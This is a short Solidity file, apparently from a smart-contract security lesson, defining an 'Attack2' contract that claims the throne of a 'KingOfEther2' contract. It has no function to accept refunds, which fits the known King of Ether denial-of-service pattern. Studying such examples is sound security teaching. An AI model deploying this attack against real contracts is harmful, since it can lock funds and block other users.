// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

import "./1.3_DoS_v2.sol";

contract Attack2 {
    KingOfEther2 kingOfEther;

    constructor(KingOfEther2 _kingOfEther) {
        kingOfEther = KingOfEther2(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
